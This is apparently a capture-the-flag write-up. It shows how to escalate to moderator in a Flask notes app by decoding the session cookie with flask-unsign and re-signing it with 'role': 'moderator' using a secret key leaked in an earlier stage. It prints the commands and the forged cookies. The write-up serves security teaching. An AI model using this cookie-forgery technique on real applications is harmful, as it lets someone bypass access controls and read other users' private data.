## Initial Reconnaissance: Finding the Flag's Location
The source code for the bot service (`bot/app.mjs`) reveals that during its startup process, it logs in and creates a note containing `FLAG_STAGE_2`:
```js
...
await page.goto(`${baseUrl}/note/new`, {waitUntil: 'networkidle2'});
        await page.type('input[name="title"]', 'My juicy note');
        await page.type('textarea[name="content"]', `Here you got some juicy flag: ${FLAG_STAGE_2}`);
        await page.click('button[type="submit"]');
        await page.waitForNavigation({waitUntil: 'networkidle2'});
        console.log(`Admin logged in as ${randomUser} with password ${password} and created initial note.`);
...
```
This tells us the flag exists in a note owned by the bot. Our goal is to gain the necessary privileges to view notes created by other users.

## The Obstacle: Moderator-Only Access
Analyzing the Flask application's source code (`main.py`) shows that the `/moderator` endpoint displays all notes from all users2. Access to this endpoint is protected by the `@moderator_required` decorator.
```python
def is_mod():
    return g.user.get('role') in ['admin', 'moderator']

def moderator_required(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not is_mod():
            return 'Unauthorized - You must be a moderator or admin to access this page', 403
        return f(*args, **kwargs)
    return decorated

@app.route('/moderator')
@login_required
@moderator_required
def moderator():
    user_notes = [(nid, notes[nid]['title'], notes[nid]['content']) for nid in notes]
    return render_template('dashboard.html', user_notes=user_notes)
```
To access this page, our session's `'role'` must be either `'moderator'` or `'admin'`.

## Session Forgery with a Known Key
Our role and a username is stored in flask session header, that look like this:
```
.eJyrViotTi1SsqpWKsrPSVWygnB1wFReYi5IJDElNzNPqbYWAECoDrg.aFZOiw.R6tcTFj2sHLz8yLP1H6vlgFebVo
```
Let's use __flask-unsign__ (pipx install flask-unsign) to decode cookie:
```sh
flask-unsign --decode --cookie '.eJyrViotTi1SsqpWKsrPSVWygnB1wFReYi5IJDElNzNPqbYWAECoDrg.aFZOiw.R6tcTFj2sHLz8yLP1H6vlgFebVo'
```
We obtain:
```
{'user': {'role': 'user', 'username': 'admin'}}
```

We can't modify contents of cookies without FLASK_API_SECRET_KEY, but we have it from "intro web 1".  So, we need to sign new cookie with __'role': 'moderator'__:
```sh
flask-unsign --sign --cookie "{'user': {'role': 'moderator', 'username': 'admin'}}" --secret 'past here your FLASK_API_SECRET_KEY'
```

It gives us new cookie: 
```
eyJ1c2VyIjp7InJvbGUiOiJtb2RlcmF0b3IiLCJ1c2VybmFtZSI6ImFkbWluIn19.aFZznQ.qMmSdmsu3mOyhRhIV0pUy4f31EM
```

Using the browser's developer tools (Inspect -> Application -> Cookies), we replace the value of our current `session` cookie with the new one we just generated.

After refreshing the page with the forged cookie, our session is now recognized as having moderator privileges. We are automatically redirected to the `/moderator` dashboard, which lists all notes from all users, including the one created by the bot containing `FLAG_STAGE_2`.

